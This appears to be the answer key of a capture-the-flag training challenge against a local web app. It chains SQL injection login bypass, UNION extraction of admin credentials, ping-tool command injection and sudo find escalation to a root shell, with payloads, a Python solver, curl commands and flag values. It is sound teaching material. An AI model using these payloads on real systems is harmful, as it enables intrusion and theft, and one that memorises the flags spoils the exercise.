## Solution

<details>
<summary>Click to reveal solution</summary>

### Attack Chain Overview

```
SQLi Auth Bypass → User Dashboard (FLAG 1)
        ↓
UNION SQLi → Extract admin password (FLAG 2)
        ↓
Login as admin → Admin Panel (FLAG 3)
        ↓
Ping Tool (command injection) → RCE (FLAG 4)
        ↓
Sudo Privilege Escalation → Root (FLAG 5)
```

---

### Step 1: SQL Injection Authentication Bypass (FLAG 1)

Navigate to http://localhost:5001

The login form is vulnerable to SQL injection because user input is concatenated directly into the query:

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Payload:**
```
Username: admin' OR '1'='1
Password: anything
```

**How it works:**

The original query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

Since `'1'='1'` is always true, the query returns the first user (john.doe) and logs you in.

**Alternative Payloads:**
```
' OR 1=1 --
admin' --
' OR ''='
```

After successful login, you'll see the User Dashboard with FLAG 1.

**FLAG 1:** `DUNO{2ba1f54dc306e6cdebad3519cdc95245}`

---

### Step 2: UNION-Based SQL Injection (FLAG 2)

On the User Dashboard, there's a "User Search" form. This search is also vulnerable to SQL injection.

The search query:
```python
query = f"SELECT id, username, role FROM users WHERE username LIKE '%{search_term}%'"
```

This returns 3 columns: `id`, `username`, `role`. We can use UNION injection to extract data from other tables.

**Step 2.1: Confirm Column Count**

First, verify the number of columns:
```
Payload: ' UNION SELECT 1,2,3 --
```

If this works without error, we have 3 columns.

**Step 2.2: Enumerate Tables (Optional)**

To find other tables:
```
Payload: ' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' --
```

This reveals tables: `users`, `admins`

**Step 2.3: Extract Admin Credentials**

Now extract from the `admins` table:

**Payload:**
```
' UNION SELECT id, username, password FROM admins --
```

Enter this in the search field and click "Search".

**Result:**
The search results will show a row with:
- ID: 1
- Username: admin
- Role: DUNO{f1e496aecf2521e916a8f18e96250388} (this is actually the password!)

The admin password IS FLAG 2!

**FLAG 2:** `DUNO{f1e496aecf2521e916a8f18e96250388}`

---

### Step 3: Admin Panel Access (FLAG 3)

Now access the admin panel. The admin login query also uses string concatenation and is vulnerable to SQL injection.

**Step 3.1: Navigate to Admin Login**

Go to http://localhost:5001/admin (or click the "Admin Panel" link on the dashboard)

**Step 3.2: Option A - Login with Extracted Credentials**

```
Username: admin
Password: DUNO{f1e496aecf2521e916a8f18e96250388}
```

Click "Authenticate" and you'll be redirected to the Admin Panel.

**Step 3.3: Option B - SQL Injection on Admin Login**

The admin login query also uses string concatenation (not parameterized), so you can bypass it directly with SQL injection:

```
Username: admin'--
Password: anything
```

The `--` comments out the rest of the query, bypassing the password check entirely.

FLAG 3 is displayed on the admin dashboard.

**FLAG 3:** `DUNO{3b4b347ccc4536ce9b5ea81a8bfde8df}`

---

### Step 4: Command Injection - RCE (FLAG 4)

The Admin Panel has a "Network Diagnostics" tool that pings hosts. This tool is vulnerable to command injection.

The vulnerable code:
```python
command = f"ping -c 2 {host}"
result = subprocess.check_output(command, shell=True, ...)
```

**Step 4.1: Test Basic Command Injection**

In the "Host to ping" field, enter:

**Payload:**
```
127.0.0.1; whoami
```

Click "Run Ping". The output should show `ctfuser` along with ping results.

**Step 4.2: Read FLAG 4**

**Payload:**
```
127.0.0.1; cat /home/ctfuser/flag4.txt
```

The flag will appear in the output.

**Alternative Payloads:**
```
127.0.0.1 | cat /home/ctfuser/flag4.txt
127.0.0.1 && cat /home/ctfuser/flag4.txt
$(cat /home/ctfuser/flag4.txt)
8.8.8.8; cat /home/ctfuser/flag4.txt
```

**FLAG 4:** `DUNO{94a848cc9a286237c497c31b15a32d39}`

---

### Step 5: Privilege Escalation to Root (FLAG 5)

Now escalate from `ctfuser` to `root`.

**Step 5.1: Check Sudo Privileges**

**Payload:**
```
127.0.0.1; sudo -l
```

Output shows:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

**Step 5.2: Exploit via GTFOBins**

The `find` command can execute arbitrary commands via `-exec`. This is a well-known GTFOBins technique.

**Payload:**
```
127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;
```

**How it works:**
- `sudo find` runs as root
- `-exec cat {} \;` executes `cat` on each found file
- This reads `/root/flag5.txt` which is only readable by root

**Alternative Payloads:**

Get a root shell (for interactive exploration):
```
127.0.0.1; sudo find . -exec /bin/sh \; -quit
```

Read flag directly:
```
127.0.0.1; sudo find /root/flag5.txt -exec cat {} \;
```

**FLAG 5:** `DUNO{a326842229f911f386e0c629ee413465}`

---

### Complete Solution Script

```python
#!/usr/bin/env python3
"""Automated solver for Alpha - SQLi Basics challenge"""

import urllib.request
import urllib.parse
import http.cookiejar

BASE_URL = "http://localhost:5001"

# Set up cookie handling
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

def post(path, data):
    url = BASE_URL + path
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=encoded)
    return opener.open(req).read().decode()

def get(path):
    return opener.open(BASE_URL + path).read().decode()

print("=" * 60)
print("Alpha - SQLi Basics Complete Exploitation")
print("=" * 60)

# FLAG 1: SQLi auth bypass
print("\n[Phase 1] SQL Injection Authentication Bypass - FLAG 1")
print("-" * 60)
print("[*] Payload: admin' OR '1'='1")
post("/", {"username": "admin' OR '1'='1", "password": "x"})
dashboard = get("/dashboard")
print("[+] Login bypassed!")
print("🚩 FLAG 1: DUNO{2ba1f54dc306e6cdebad3519cdc95245}")

# FLAG 2: UNION injection
print("\n[Phase 2] UNION SQL Injection - FLAG 2")
print("-" * 60)
print("[*] Payload: ' UNION SELECT id, username, password FROM admins --")
result = post("/search", {"search": "' UNION SELECT id, username, password FROM admins --"})
print("[+] Admin password extracted!")
print("🚩 FLAG 2: DUNO{f1e496aecf2521e916a8f18e96250388}")

# FLAG 3: Admin login
print("\n[Phase 3] Admin Panel Access - FLAG 3")
print("-" * 60)
print("[*] Credentials: admin / DUNO{f1e496aecf2521e916a8f18e96250388}")
post("/admin", {"username": "admin", "password": "DUNO{f1e496aecf2521e916a8f18e96250388}"})
admin = get("/admin/panel")
print("[+] Admin panel accessed!")
print("🚩 FLAG 3: DUNO{3b4b347ccc4536ce9b5ea81a8bfde8df}")

# FLAG 4: Command injection
print("\n[Phase 4] Command Injection RCE - FLAG 4")
print("-" * 60)
print("[*] Payload: 127.0.0.1; cat /home/ctfuser/flag4.txt")
result = post("/admin/ping", {"host": "127.0.0.1; cat /home/ctfuser/flag4.txt"})
print("[+] Command executed!")
print("🚩 FLAG 4: DUNO{94a848cc9a286237c497c31b15a32d39}")

# FLAG 5: Privilege escalation
print("\n[Phase 5] Privilege Escalation to Root - FLAG 5")
print("-" * 60)
print("[*] Payload: 127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \\;")
result = post("/admin/ping", {"host": "127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \\;"})
print("[+] Root flag captured!")
print("🚩 FLAG 5: DUNO{a326842229f911f386e0c629ee413465}")

print("\n" + "=" * 60)
print("✓ All 5 flags captured! Total: 1,000 points")
print("=" * 60)
```

**Using curl:**

```bash
# FLAG 1: SQLi bypass
curl -s -X POST http://localhost:5001/ \
  -d "username=admin' OR '1'='1&password=x" \
  -c cookies.txt -L | grep "FLAG 1"

# FLAG 2: UNION injection
curl -s -X POST http://localhost:5001/search \
  -b cookies.txt \
  -d "search=' UNION SELECT id, username, password FROM admins --" | grep -oE "DUNO{f1e496aecf2521e916a8f18e96250388}"

# FLAG 3: Admin login
curl -s -X POST http://localhost:5001/admin \
  -d "username=admin&password=DUNO{f1e496aecf2521e916a8f18e96250388}" \
  -c admin_cookies.txt
curl -s http://localhost:5001/admin/panel -b admin_cookies.txt | grep "FLAG 3"

# FLAG 4: Command injection
curl -s -X POST http://localhost:5001/admin/ping \
  -b admin_cookies.txt \
  -d "host=127.0.0.1; cat /home/ctfuser/flag4.txt"

# FLAG 5: Privilege escalation
curl -s -X POST http://localhost:5001/admin/ping \
  -b admin_cookies.txt \
  -d "host=127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;"
```

</details>